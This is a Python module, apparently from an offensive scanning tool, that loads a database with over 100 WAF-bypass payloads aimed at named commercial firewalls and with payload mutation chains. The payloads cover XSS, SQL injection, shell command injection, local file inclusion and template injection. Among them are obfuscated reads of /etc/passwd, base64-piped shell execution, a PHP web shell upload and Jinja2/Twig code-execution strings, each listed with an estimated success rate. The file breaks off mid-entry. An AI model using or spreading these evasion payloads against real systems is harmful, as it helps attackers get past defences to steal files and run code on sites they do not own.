"""
Advanced Training Modules — Expert-level knowledge injection for Phantom's AI.

Three specialized training engines:
1. WAF Evasion Lab — 100+ bypass payloads for top 10 WAFs
2. Payload Mutation Engine — 30+ mutation techniques with chained transforms
3. Scan Feedback Loop — 25+ adaptive strategy rules
"""
import logging
from datetime import datetime

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Dedup helper (same pattern as knowledge_injection.py)
# ---------------------------------------------------------------------------

async def _dedup_and_insert(
    db: AsyncSession,
    patterns: list[dict],
    dedup_key_field: str = "key",
) -> dict:
    """Insert patterns with dedup. Returns {created, skipped, categories}."""
    stats = {"created": 0, "skipped": 0, "categories": {}}

    for p in patterns:
        key = p["pattern_data"].get(dedup_key_field, "")
        existing = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.pattern_type == p["pattern_type"],
                KnowledgePattern.technology == p.get("technology"),
                KnowledgePattern.vuln_type == p.get("vuln_type"),
                KnowledgePattern.pattern_data[dedup_key_field].as_string() == key,
            ).limit(1)
        )

        if existing.scalar_one_or_none():
            stats["skipped"] += 1
            continue

        record = KnowledgePattern(
            pattern_type=p["pattern_type"],
            technology=p.get("technology"),
            vuln_type=p.get("vuln_type"),
            pattern_data=p["pattern_data"],
            confidence=p.get("confidence", 0.85),
            sample_count=p.get("sample_count", 50),
        )
        db.add(record)
        stats["created"] += 1

        cat = p["pattern_type"]
        stats["categories"][cat] = stats["categories"].get(cat, 0) + 1

    await db.commit()
    return stats


# ===================================================================
# MODULE 1: WAF Evasion Lab
# ===================================================================

def _waf_evasion_payloads() -> list[dict]:
    """Generate 100+ WAF bypass payloads for top 10 WAFs."""
    payloads: list[dict] = []

    def _add(waf: str, attack_type: str, technique: str,
             original: str, bypass: str, rate: float, notes: str):
        payloads.append({
            "pattern_type": "waf_evasion",
            "technology": waf,
            "vuln_type": attack_type,
            "confidence": rate,
            "sample_count": 30,
            "pattern_data": {
                "key": f"{waf}:{attack_type}:{technique}:{bypass[:40]}",
                "waf": waf,
                "attack_type": attack_type,
                "bypass_technique": technique,
                "original_payload": original,
                "bypass_payload": bypass,
                "success_rate": rate,
                "notes": notes,
            },
        })

    # ---- Cloudflare ----
    cf = "cloudflare"
    _add(cf, "xss", "unicode normalization",
         "<script>alert(1)</script>",
         "<scr\u0130pt>alert(1)</scr\u0130pt>",
         0.6, "Works on Turkish locale")
    _add(cf, "xss", "chunked encoding",
         "<script>alert(1)</script>",
         "<scr\r\nipt>alert(1)</scr\r\nipt>",
         0.55, "Chunked transfer encoding splits tokens")
    _add(cf, "xss", "JSON content-type bypass",
         "<script>alert(1)</script>",
         '{"x":"<script>alert(1)</script>"}',
         0.5, "Send as application/json to bypass HTML-focused rules")
    _add(cf, "xss", "double encoding",
         "<script>alert(1)</script>",
         "%253Cscript%253Ealert(1)%253C/script%253E",
         0.65, "Double URL-encode to bypass single-decode filters")
    _add(cf, "xss", "HPP (HTTP Parameter Pollution)",
         "<script>alert(1)</script>",
         "param=<scr&param=ipt>alert(1)</scr&param=ipt>",
         0.45, "Split payload across duplicate parameters")
    _add(cf, "sqli", "unicode normalization",
         "' OR 1=1--",
         "' \u004fR 1=1--",
         0.5, "Unicode fullwidth OR")
    _add(cf, "sqli", "chunked encoding",
         "UNION SELECT 1,2,3",
         "UNI%0aON SEL%0aECT 1,2,3",
         0.55, "Newline injection within SQL keywords")
    _add(cf, "sqli", "double encoding",
         "' OR 1=1--",
         "%2527%2520OR%25201%253D1--",
         0.6, "Double-encoded single quote and spaces")
    _add(cf, "rce", "JSON content-type bypass",
         "; cat /etc/passwd",
         '{"cmd":"; cat /etc/passwd"}',
         0.4, "JSON body may bypass query string rules")
    _add(cf, "lfi", "double encoding",
         "../../etc/passwd",
         "..%252F..%252Fetc%252Fpasswd",
         0.65, "Double-encode path separators")
    _add(cf, "xss", "SVG event handler",
         "<script>alert(1)</script>",
         "<svg/onload=alert(1)>",
         0.6, "SVG tags often bypass script-focused rules")
    _add(cf, "xss", "template literal",
         "alert(1)",
         "${alert`1`}",
         0.5, "Template literals bypass parenthesis filters")

    # ---- Akamai ----
    ak = "akamai"
    _add(ak, "xss", "case variation",
         "<script>alert(1)</script>",
         "<ScRiPt>alert(1)</sCrIpT>",
         0.55, "Mixed case bypasses case-sensitive rules")
    _add(ak, "sqli", "comment injection",
         "UNION SELECT",
         "UN/*!*/ION SEL/*!*/ECT",
         0.7, "MySQL inline comments split keywords")
    _add(ak, "xss", "multipart form data bypass",
         "<script>alert(1)</script>",
         "Content-Type: multipart/form-data; <script>alert(1)</script>",
         0.45, "Multipart boundaries confuse parsers")
    _add(ak, "sqli", "cookie injection",
         "' OR 1=1--",
         "Cookie: session=' OR 1=1--",
         0.5, "Some WAFs skip cookie inspection")
    _add(ak, "xss", "HTML entity encoding",
         "<script>alert(1)</script>",
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         0.5, "HTML entities decoded by browser, not WAF")
    _add(ak, "rce", "case variation",
         "cat /etc/passwd",
         "c''a''t /etc/passwd",
         0.6, "Quote-broken shell commands")
    _add(ak, "lfi", "comment injection",
         "../etc/passwd",
         "..%2f%2f/etc/passwd",
         0.55, "Double slash normalization")
    _add(ak, "sqli", "multipart form data bypass",
         "' OR 1=1--",
         "------boundary\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n' OR 1=1--",
         0.5, "Multipart body may not be fully inspected")
    _add(ak, "xss", "event handler obfuscation",
         "<img onerror=alert(1)>",
         "<img src=x oNeRrOr=alert(1)>",
         0.55, "Mixed case event handlers")
    _add(ak, "sqli", "hex encoding",
         "UNION SELECT",
         "0x554e494f4e2053454c454354",
         0.45, "Hex-encoded SQL keywords")

    # ---- AWS WAF ----
    aws = "aws_waf"
    _add(aws, "xss", "null bytes",
         "<script>alert(1)</script>",
         "<scri%00pt>alert(1)</scri%00pt>",
         0.5, "Null bytes terminate string matching")
    _add(aws, "sqli", "tab/newline injection",
         "UNION SELECT",
         "UNION\tSELECT",
         0.6, "Tab characters as whitespace alternative")
    _add(aws, "sqli", "HTTP/2 smuggling",
         "' OR 1=1--",
         "Transfer-Encoding: chunked\r\n\r\n1\r\n'\r\n",
         0.4, "HTTP/2 request smuggling to bypass inspection")
    _add(aws, "lfi", "path normalization",
         "../../etc/passwd",
         "..\\..\\etc\\passwd",
         0.55, "Backslash path traversal on Linux")
    _add(aws, "xss", "tab/newline injection",
         "<script>alert(1)</script>",
         "<scr\tipt>alert(1)</scr\tipt>",
         0.5, "Tab within tag name")
    _add(aws, "rce", "null bytes",
         "; cat /etc/passwd",
         ";%00cat%00/etc/passwd",
         0.45, "Null bytes split command tokens")
    _add(aws, "sqli", "path normalization",
         "1' AND 1=1--",
         "1%27%20AND%201%3D1--",
         0.55, "URL-encoded but not double-decoded")
    _add(aws, "xss", "data URI",
         "<script>alert(1)</script>",
         "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>x</a>",
         0.5, "Base64 data URI bypasses content inspection")
    _add(aws, "sqli", "newline injection",
         "UNION SELECT 1,2,3",
         "UNION%0aSELECT%0a1,2,3",
         0.6, "Newline between SQL keywords")
    _add(aws, "lfi", "null byte termination",
         "../../etc/passwd",
         "../../etc/passwd%00.png",
         0.55, "Null byte before extension (old PHP)")

    # ---- ModSecurity ----
    ms = "modsecurity"
    _add(ms, "sqli", "paranoia level bypass",
         "' OR 1=1--",
         "' OR 2>1--",
         0.65, "Comparison operators bypass PL1 rules")
    _add(ms, "sqli", "rule ID 942100 bypass",
         "UNION SELECT",
         "UN%49ON SE%4CECT",
         0.55, "Partial URL encoding breaks keyword match")
    _add(ms, "xss", "transformation bypass",
         "<script>alert(1)</script>",
         "<script>alert`1`</script>",
         0.6, "Template literal parenthesis bypass")
    _add(ms, "xss", "rule ID 941100 bypass",
         "<script>alert(1)</script>",
         "<details open ontoggle=alert(1)>",
         0.7, "Lesser-known HTML5 event handlers")
    _add(ms, "rce", "paranoia level bypass",
         "| cat /etc/passwd",
         "| ca$@t /etc/pas$@swd",
         0.5, "Bash empty variable insertion")
    _add(ms, "sqli", "transformation bypass",
         "1' AND 1=1--",
         "1'%20AND%20true--",
         0.55, "Boolean keyword instead of numeric comparison")
    _add(ms, "lfi", "paranoia level bypass",
         "../../etc/passwd",
         "....//....//etc/passwd",
         0.6, "Double dot-slash for filter removal bypass")
    _add(ms, "xss", "paranoia level bypass",
         "<img onerror=alert(1)>",
         "<img src=x onerror=alert&lpar;1&rpar;>",
         0.5, "HTML entity-encoded parentheses")
    _add(ms, "sqli", "comment nesting",
         "UNION SELECT",
         "/*!50000UNION*//*!50000SELECT*/",
         0.65, "MySQL versioned comments bypass")
    _add(ms, "rce", "rule specific bypass",
         "; ls",
         ";+$({ls,})",
         0.45, "Brace expansion in bash")

    # ---- Imperva / Incapsula ----
    imp = "imperva"
    _add(imp, "xss", "IP rotation",
         "<script>alert(1)</script>",
         "<script>alert(1)</script>",
         0.3, "Rotate source IPs to avoid behavioral blocking")
    _add(imp, "sqli", "header manipulation",
         "' OR 1=1--",
         "X-Forwarded-For: 127.0.0.1\r\n' OR 1=1--",
         0.4, "Trusted IP header spoofing")
    _add(imp, "xss", "payload fragmentation",
         "<script>alert(1)</script>",
         "<scr<script>ipt>alert(1)</scr</script>ipt>",
         0.5, "Nested tag confuses parser")
    _add(imp, "sqli", "payload fragmentation",
         "UNION SELECT",
         "UNI/**/ON/**/SEL/**/ECT",
         0.6, "SQL comment fragmentation")
    _add(imp, "rce", "header manipulation",
         "; cat /etc/passwd",
         "X-Original-URL: /;cat /etc/passwd",
         0.35, "Override URL via internal header")
    _add(imp, "lfi", "payload fragmentation",
         "../../etc/passwd",
         ".%2e/.%2e/etc/passwd",
         0.55, "Mixed encoding path traversal")
    _add(imp, "xss", "header manipulation",
         "<script>alert(1)</script>",
         "Referer: <script>alert(1)</script>",
         0.4, "Inject via less-inspected headers")
    _add(imp, "sqli", "IP rotation",
         "' OR 1=1--",
         "' OR 1=1--",
         0.35, "Rate limit evasion via IP rotation")
    _add(imp, "xss", "DOM clobbering",
         "alert(document.cookie)",
         "<form id=x><input name=cookie value=stolen></form>",
         0.45, "DOM clobbering to override properties")
    _add(imp, "rce", "payload fragmentation",
         "cat /etc/passwd",
         "c'a't /e't'c/pa's'swd",
         0.5, "Quote-fragmented shell command")

    # ---- F5 BIG-IP ----
    f5 = "f5_bigip"
    _add(f5, "xss", "encoding bypass (ASM)",
         "<script>alert(1)</script>",
         "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
         0.5, "URL-encoded tags bypass ASM HTML parsing")
    _add(f5, "sqli", "whitelist abuse",
         "' OR 1=1--",
         "admin' AND '1'='1",
         0.55, "Appear as legitimate query pattern")
    _add(f5, "xss", "whitelist abuse",
         "<script>alert(1)</script>",
         "<b onmouseover=alert(1)>hover</b>",
         0.6, "Allowed tags with event handlers")
    _add(f5, "sqli", "encoding bypass (ASM)",
         "UNION SELECT 1,2",
         "UNION%20ALL%20SELECT%201,2",
         0.5, "UNION ALL variant less detected")
    _add(f5, "rce", "encoding bypass (ASM)",
         "; whoami",
         "%3Bwhoami",
         0.45, "URL-encoded semicolon")
    _add(f5, "lfi", "whitelist abuse",
         "../../etc/passwd",
         "/static/../../etc/passwd",
         0.5, "Prepend whitelisted path prefix")
    _add(f5, "xss", "JavaScript protocol",
         "javascript:alert(1)",
         "jAvAsCrIpT:alert(1)",
         0.55, "Case variation on protocol")
    _add(f5, "sqli", "time-based bypass",
         "' AND SLEEP(5)--",
         "' AND BENCHMARK(10000000,SHA1('a'))--",
         0.5, "BENCHMARK instead of SLEEP")
    _add(f5, "xss", "meta refresh",
         "<script>alert(1)</script>",
         '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
         0.45, "Meta refresh redirect to JS")
    _add(f5, "rce", "whitelist abuse",
         "| id",
         "| /usr/bin/id",
         0.4, "Full path may bypass command name filter")

    # ---- Sucuri ----
    su = "sucuri"
    _add(su, "xss", "WordPress-specific bypass",
         "<script>alert(1)</script>",
         "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
         0.5, "IE conditional comments")
    _add(su, "sqli", "PHP wrapper tricks",
         "' OR 1=1--",
         "' OR/**/1=1--",
         0.6, "Comment as whitespace replacement")
    _add(su, "lfi", "PHP wrapper tricks",
         "../../etc/passwd",
         "php://filter/convert.base64-encode/resource=../../etc/passwd",
         0.7, "PHP stream wrapper for LFI")
    _add(su, "xss", "PHP wrapper tricks",
         "<script>alert(1)</script>",
         "data://text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
         0.55, "Data stream wrapper XSS")
    _add(su, "rce", "WordPress-specific bypass",
         "; cat /etc/passwd",
         "<?php system('cat /etc/passwd'); ?>",
         0.4, "Via file upload/theme editor")
    _add(su, "sqli", "WordPress-specific bypass",
         "' OR 1=1--",
         "' OR 1=1-- -",
         0.5, "MySQL comment with trailing space-dash")
    _add(su, "xss", "event handler bypass",
         "<script>alert(1)</script>",
         '<body onpageshow=alert(1)>',
         0.5, "Less common event handlers")
    _add(su, "lfi", "WordPress-specific bypass",
         "/etc/passwd",
         "/wp-content/themes/../../../etc/passwd",
         0.55, "Via WordPress theme path")
    _add(su, "rce", "PHP wrapper tricks",
         "system('id')",
         "php://input (POST: <?php system('id'); ?>)",
         0.45, "PHP input stream for RCE")
    _add(su, "sqli", "obfuscation",
         "UNION SELECT",
         "UnIoN%20SeLeCt",
         0.5, "Mixed case + URL encoding")

    # ---- Barracuda ----
    ba = "barracuda"
    _add(ba, "xss", "content-length manipulation",
         "<script>alert(1)</script>",
         "<script>alert(1)</script>" + " " * 5000,
         0.45, "Large padding to exceed inspection buffer")
    _add(ba, "sqli", "boundary abuse",
         "' OR 1=1--",
         "------BOUNDARY\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n' OR 1=1--\r\n------BOUNDARY--",
         0.5, "Custom multipart boundary confuses parser")
    _add(ba, "xss", "boundary abuse",
         "<script>alert(1)</script>",
         "------BOUND\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>",
         0.45, "Nested content-type in multipart")
    _add(ba, "rce", "content-length manipulation",
         "; id",
         "A" * 4096 + "; id",
         0.4, "Buffer overflow in inspection engine")
    _add(ba, "lfi", "content-length manipulation",
         "../../etc/passwd",
         "x=AAAA...&file=../../etc/passwd",
         0.45, "Large parameter before payload")
    _add(ba, "sqli", "content-length manipulation",
         "' UNION SELECT 1--",
         "' UNION SELECT 1--" + "%20" * 2000,
         0.4, "Whitespace padding after payload")
    _add(ba, "xss", "encoding chain",
         "<script>alert(1)</script>",
         "%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e",
         0.5, "Full hex URL encoding")
    _add(ba, "sqli", "encoding chain",
         "UNION SELECT",
         "UNION%a0SELECT",
         0.55, "Non-breaking space character")
    _add(ba, "rce", "boundary abuse",
         "; cat /etc/passwd",
         "filename=\"shell.php\"\r\n\r\n<?php system($_GET['c']); ?>",
         0.35, "File upload via multipart boundary manipulation")
    _add(ba, "lfi", "boundary abuse",
         "../../etc/passwd",
         "..%c0%af..%c0%afetc%c0%afpasswd",
         0.5, "Overlong UTF-8 encoding")

    # ---- Fortinet FortiWeb ----
    fw = "fortinet_fortiweb"
    _add(fw, "xss", "character set tricks",
         "<script>alert(1)</script>",
         "<script>alert(1)</script>".encode("utf-7").decode("ascii", errors="replace").replace("\ufffd", "?"),
         0.4, "UTF-7 encoded payload with charset header")
    _add(fw, "xss", "character set tricks (v2)",
         "<script>alert(1)</script>",
         "\xbc\x73\x63\x72\x69\x70\x74\xbe alert(1) \xbc/\x73\x63\x72\x69\x70\x74\xbe",
         0.35, "US-ASCII shifted angle brackets")
    _add(fw, "sqli", "double URL encoding",
         "' OR 1=1--",
         "%252527%252520OR%2525201%25253D1--",
         0.55, "Triple URL encoding")
    _add(fw, "lfi", "double URL encoding",
         "../../etc/passwd",
         "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
         0.6, "Double-encoded dots and slashes")
    _add(fw, "xss", "double URL encoding",
         "<script>alert(1)</script>",
         "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
         0.55, "Double-encoded full XSS payload")
    _add(fw, "rce", "character set tricks",
         "; id",
         "$IFS;id",
         0.5, "IFS (Internal Field Separator) as space replacement")
    _add(fw, "sqli", "character set tricks",
         "UNION SELECT",
         "UNION%0bSELECT",
         0.5, "Vertical tab as whitespace")
    _add(fw, "rce", "double URL encoding",
         "| cat /etc/passwd",
         "%257C%2520cat%2520%252Fetc%252Fpasswd",
         0.5, "Double-encoded pipe and spaces")
    _add(fw, "lfi", "character set tricks",
         "../../etc/passwd",
         "..%ff%2f..%ff%2fetc/passwd",
         0.4, "Invalid UTF-8 byte before slash")
    _add(fw, "xss", "SVG polyglot",
         "<script>alert(1)</script>",
         "<svg><animatetransform onbegin=alert(1)>",
         0.55, "SVG animation event handler")

    # ---- Azure WAF ----
    az = "azure_waf"
    _add(az, "lfi", "path traversal encoding",
         "../../etc/passwd",
         "..%5c..%5cetc%5cpasswd",
         0.55, "Backslash URL-encoded path traversal")
    _add(az, "sqli", "OWASP CRS bypass",
         "' OR 1=1--",
         "' OR 1 LIKE 1--",
         0.6, "LIKE operator less commonly filtered")
    _add(az, "xss", "OWASP CRS bypass",
         "<script>alert(1)</script>",
         "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>",
         0.55, "srcdoc with HTML entities")
    _add(az, "xss", "path traversal encoding",
         "<script>alert(1)</script>",
         "/..;/<script>alert(1)</script>",
         0.45, "Semicolon path normalization")
    _add(az, "rce", "OWASP CRS bypass",
         "; id",
         "a]||id||[a",
         0.5, "Array operator command injection")
    _add(az, "sqli", "path traversal encoding",
         "' AND 1=1--",
         "%27%20AND%201%3D1--",
         0.5, "Standard URL encoding sometimes sufficient")
    _add(az, "lfi", "OWASP CRS bypass",
         "/etc/passwd",
         "/etc/passwd.....",
         0.4, "Trailing dots bypass extension check")
    _add(az, "xss", "object tag bypass",
         "<script>alert(1)</script>",
         '<object data="javascript:alert(1)">',
         0.5, "Object tag with JS protocol")
    _add(az, "sqli", "function bypass",
         "UNION SELECT 1,2",
         "UNION SELECT 1,CHAR(50)",
         0.55, "CHAR() function instead of literal")
    _add(az, "rce", "path traversal encoding",
         "| cat /etc/passwd",
         "| ca\\t /et\\c/pass\\wd",
         0.45, "Backslash escape within command")

    return payloads


# ===================================================================
# MODULE 2: Payload Mutation Engine
# ===================================================================

def _mutation_knowledge() -> list[dict]:
    """Generate 30+ mutation technique patterns with chained transforms."""
    patterns: list[dict] = []

    def _add(technique: str, attack_type: str, original: str,
             mutated: str, steps: list[str], target: str,
             confidence: float = 0.7, notes: str = ""):
        patterns.append({
            "pattern_type": "payload_mutation",
            "technology": None,
            "vuln_type": attack_type,
            "confidence": confidence,
            "sample_count": 40,
            "pattern_data": {
                "key": f"mutation:{technique}:{attack_type}:{mutated[:30]}",
                "technique": technique,
                "attack_type": attack_type,
                "original": original,
                "mutated": mutated,
                "encoding_steps": steps,
                "evasion_target": target,
                "notes": notes,
            },
        })

    # --- XSS Mutations ---
    _add("case_alternation", "xss",
         "<script>alert(1)</script>",
         "<ScRiPt>alert(1)</sCrIpT>",
         ["alternate_case(tag_name)"],
         "generic",
         0.65, "Simple case toggle on HTML tags")

    _add("html_entity_encoding", "xss",
         "<script>alert(1)</script>",
         "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
         ["hex_entity_encode(angle_brackets)"],
         "waf",
         0.6, "Hex HTML entities for angle brackets")

    _add("html_entity_decimal", "xss",
         "<script>alert(1)</script>",
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         ["decimal_entity_encode(angle_brackets)"],
         "waf",
         0.6, "Decimal HTML entities")

    _add("double_url_encoding", "xss",
         "<script>alert(1)</script>",
         "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
         ["url_encode", "url_encode"],
         "waf",
         0.7, "Double URL encoding bypasses single-decode WAFs")

    _add("unicode_encoding", "xss",
         "<script>alert(1)</script>",
         "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
         ["unicode_escape(angle_brackets)"],
         "waf",
         0.55, "JavaScript Unicode escape sequences")

    _add("null_byte_injection", "xss",
         "<script>alert(1)</script>",
         "%00<script>alert(1)</script>",
         ["prepend(null_byte)"],
         "ids",
         0.5, "Null byte terminates C-string matching")

    _add("svg_vector", "xss",
         "<script>alert(1)</script>",
         "<svg onload=alert(1)>",
         ["replace(script_tag, svg_event)"],
         "generic",
         0.75, "SVG onload widely supported, less filtered")

    _add("svg_animate", "xss",
         "<script>alert(1)</script>",
         "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
         ["replace(script_tag, svg_animate_event)"],
         "waf",
         0.6, "SVG animate event handler")

    _add("event_handler_img", "xss",
         "<script>alert(1)</script>",
         '<img src=x onerror=alert(1)>',
         ["replace(script_tag, img_onerror)"],
         "generic",
         0.8, "Classic img onerror payload")

    _add("event_handler_body", "xss",
         "<script>alert(1)</script>",
         "<body onload=alert(1)>",
         ["replace(script_tag, body_onload)"],
         "generic",
         0.6, "body onload event handler")

    _add("event_handler_details", "xss",
         "<script>alert(1)</script>",
         "<details open ontoggle=alert(1)>",
         ["replace(script_tag, details_ontoggle)"],
         "waf",
         0.7, "HTML5 details element event")

    _add("event_handler_marquee", "xss",
         "<script>alert(1)</script>",
         "<marquee onstart=alert(1)>",
         ["replace(script_tag, marquee_onstart)"],
         "waf",
         0.55, "Marquee event handler rarely filtered")

    _add("event_handler_video", "xss",
         "<script>alert(1)</script>",
         "<video src=x onerror=alert(1)>",
         ["replace(script_tag, video_onerror)"],
         "waf",
         0.6, "Video element error handler")

    _add("event_handler_input", "xss",
         "<script>alert(1)</script>",
         "<input onfocus=alert(1) autofocus>",
         ["replace(script_tag, input_autofocus)"],
         "waf",
         0.65, "Autofocus triggers onfocus automatically")

    _add("event_handler_select", "xss",
         "<script>alert(1)</script>",
         "<select onfocus=alert(1) autofocus>",
         ["replace(script_tag, select_autofocus)"],
         "waf",
         0.55, "Select autofocus variant")

    _add("event_handler_textarea", "xss",
         "<script>alert(1)</script>",
         "<textarea onfocus=alert(1) autofocus>",
         ["replace(script_tag, textarea_autofocus)"],
         "waf",
         0.55, "Textarea autofocus variant")

    _add("javascript_protocol", "xss",
         "<script>alert(1)</script>",
         '<a href="javascript:alert(1)">click</a>',
         ["replace(script_tag, anchor_js_proto)"],
         "generic",
         0.7, "JavaScript protocol in href")

    _add("data_uri", "xss",
         "<script>alert(1)</script>",
         '<a href="data:text/html,<script>alert(1)</script>">x</a>',
         ["wrap(data_uri)"],
         "waf",
         0.5, "Data URI scheme for payload delivery")

    _add("template_literal", "xss",
         "alert(1)",
         "alert`1`",
         ["replace(parens, template_literal)"],
         "waf",
         0.65, "Template literals bypass parenthesis filters")

    _add("css_injection", "xss",
         "<script>alert(1)</script>",
         "<style>@import 'javascript:alert(1)';</style>",
         ["replace(script_tag, css_import)"],
         "ids",
         0.3, "CSS import (legacy browsers)")

    _add("markdown_injection", "xss",
         "<script>alert(1)</script>",
         "[Click](javascript:alert(1))",
         ["replace(script_tag, markdown_link)"],
         "generic",
         0.5, "Markdown rendered to HTML with JS protocol")

    # --- SQLi Mutations ---
    _add("comment_insertion", "sqli",
         "UNION SELECT 1,2,3",
         "UN/**/ION SEL/**/ECT 1,2,3",
         ["insert_comments(keywords)"],
         "waf",
         0.75, "SQL comments split keywords for WAF bypass")

    _add("whitespace_alternatives", "sqli",
         "UNION SELECT 1,2,3",
         "UNION\tSELECT\t1,2,3",
         ["replace(space, tab)"],
         "waf",
         0.65, "Tab characters as space alternative")

    _add("whitespace_newline", "sqli",
         "UNION SELECT 1,2,3",
         "UNION\nSELECT\n1,2,3",
         ["replace(space, newline)"],
         "waf",
         0.6, "Newline characters as space alternative")

    _add("whitespace_vertical_tab", "sqli",
         "UNION SELECT 1,2,3",
         "UNION\x0bSELECT\x0b1,2,3",
         ["replace(space, vertical_tab)"],
         "waf",
         0.5, "Vertical tab as whitespace")

    _add("whitespace_form_feed", "sqli",
         "UNION SELECT 1,2,3",
         "UNION\x0cSELECT\x0c1,2,3",
         ["replace(space, form_feed)"],
         "waf",
         0.5, "Form feed as whitespace")

    _add("string_concatenation_hex", "sqli",
         "SELECT 'admin'",
         "SELECT CONCAT(0x61,0x64,0x6d,0x69,0x6e)",
         ["hex_encode(string_literal)", "wrap(CONCAT)"],
         "waf",
         0.7, "Hex byte concatenation avoids string matching")

    _add("hex_encoding", "sqli",
         "SELECT 'admin'",
         "SELECT 0x61646d696e",
         ["hex_encode(string_literal)"],
         "generic",
         0.75, "MySQL hex string literal")

    _add("case_alternation", "sqli",
         "UNION SELECT",
         "uNiOn SeLeCt",
         ["alternate_case(keywords)"],
         "generic",
         0.6, "Mixed case SQL keywords")

    _add("versioned_comment", "sqli",
         "UNION SELECT",
         "/*!50000UNION*//*!50000SELECT*/",
         ["wrap(mysql_versioned_comment)"],
         "waf",
         0.7, "MySQL versioned comments")

    _add("double_url_encoding", "sqli",
         "' OR 1=1--",
         "%2527%2520OR%25201%253D1--",
         ["url_encode", "url_encode"],
         "waf",
         0.65, "Double URL encoded SQL injection")

    # --- RCE Mutations ---
    _add("quote_breaking", "rce",
         "cat /etc/passwd",
         "c''a''t /e''t''c/p''a''s''s''w''d",
         ["insert(single_quotes_between_chars)"],
         "waf",
         0.6, "Shell ignores empty quotes within commands")

    _add("variable_insertion", "rce",
         "cat /etc/passwd",
         "ca$@t /et$@c/pas$@swd",
         ["insert(empty_var_between_chars)"],
         "waf",
         0.55, "$@ expands to empty in bash")

    _add("ifs_replacement", "rce",
         "cat /etc/passwd",
         "cat${IFS}/etc/passwd",
         ["replace(space, ifs_var)"],
         "waf",
         0.7, "$IFS is Internal Field Separator (space)")

    _add("base64_execution", "rce",
         "cat /etc/passwd",
         "echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
         ["base64_encode", "wrap(echo_pipe_decode_exec)"],
         "waf",
         0.65, "Base64 encode and execute at runtime")

    _add("hex_execution", "rce",
         "id",
         "$(printf '\\x69\\x64')",
         ["hex_encode(command)", "wrap(printf_subshell)"],
         "waf",
         0.6, "Printf hex characters in subshell")

    _add("brace_expansion", "rce",
         "cat /etc/passwd",
         "{cat,/etc/passwd}",
         ["wrap(brace_expansion)"],
         "waf",
         0.55, "Bash brace expansion as command execution")

    _add("wildcard_bypass", "rce",
         "cat /etc/passwd",
         "/bin/ca? /etc/passw?",
         ["replace(last_char, wildcard)"],
         "waf",
         0.6, "Glob wildcards bypass exact command matching")

    # --- LFI Mutations ---
    _add("null_byte_termination", "lfi",
         "../../etc/passwd",
         "../../etc/passwd%00.png",
         ["append(null_byte + fake_extension)"],
         "generic",
         0.5, "Null byte truncation (older PHP)")

    _add("double_encoding", "lfi",
         "../../etc/passwd",
         "..%252f..%252fetc%252fpasswd",
         ["url_encode(slashes)", "url_encode"],
         "waf",
         0.65, "Double-encoded path separators")

    _add("utf8_overlong", "lfi",
         "../../etc/passwd",
         "..%c0%af..%c0%afetc%c0%afpasswd",
         ["overlong_utf8_encode(slash)"],
         "waf",
         0.5, "Overlong UTF-8 for slash character")

    _add("php_wrapper_filter", "lfi",
         "../../etc/passwd",
         "php://filter/convert.base64-encode/resource=../../etc/passwd",
         ["wrap(php_filter_stream)"],
         "generic",
         0.8, "PHP stream wrapper reads file as base64")

    _add("php_wrapper_input", "lfi",
         "../../etc/passwd",
         "php://input",
         ["replace(path, php_input_stream)"],
         "generic",
         0.7, "PHP input stream with POST body payload")

    # --- SSTI Mutations ---
    _add("jinja2_bypass", "ssti",
         "{{7*7}}",
         "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
         ["attr_filter_bypass", "hex_encode(underscores)"],
         "waf",
         0.6, "Jinja2 attribute access via |attr filter with hex")

    _add("jinja2_concat", "ssti",
         "{{config}}",
         "{{'con'+'fig'}}",
         ["string_concat(keyword)"],
         "waf",
         0.55, "String concatenation to avoid keyword filter")

    _add("twig_bypass", "ssti",
         "{{_self.env.registerUndefinedFilterCallback('exec')}}",
         "{{['id']|filter('system')}}",
         ["replace(method, twig_filter)"],
         "waf",
         0.6, "Twig filter-based RCE")

    # --- Mutation Chains (combined techniques) ---
    _add("chain:double_encode+case+comment", "sqli",
         "UNION SELECT 1,2,3",
         "%2555%254e%2549%254f%254e%2520%2553%2545%254c%2545%2543%2554",
         ["alternate_case", "insert_comments", "double_url_encode"],
         "waf",
         0.75, "Triple technique chain for maximum evasion")

    _add("chain:unicode+nullbyte+whitespace", "xss",
         "<script>alert(1)</script>",
         "\\u003Cscri%00pt>alert(1)\\u003C/scr\tipt\\u003E",
         ["unicode_escape(brackets)", "null_byte_inject", "tab_inject"],
         "waf",
         0.6, "Mixed encoding chain")

    _add("chain:hex+case+comment", "sqli",
         "UNION SELECT 'admin'",
         "uNi/**/On sEl/**/EcT 0x61646d696e",
         ["alternate_case(keywords)", "insert_comments(keywords)", "hex_encode(strings)"],
         "waf",
         0.7, "Case + comment + hex encoding chain")

    _add("chain:ifs+base64+wildcard", "rce",
         "cat /etc/passwd",
         "echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|/bin/s?",
         ["replace(space, ifs)", "base64_encode(command)", "wildcard(shell)"],
         "waf",
         0.6, "IFS + base64 + glob wildcard chain")

    _add("chain:double_encode+php_wrapper", "lfi",
         "../../etc/passwd",
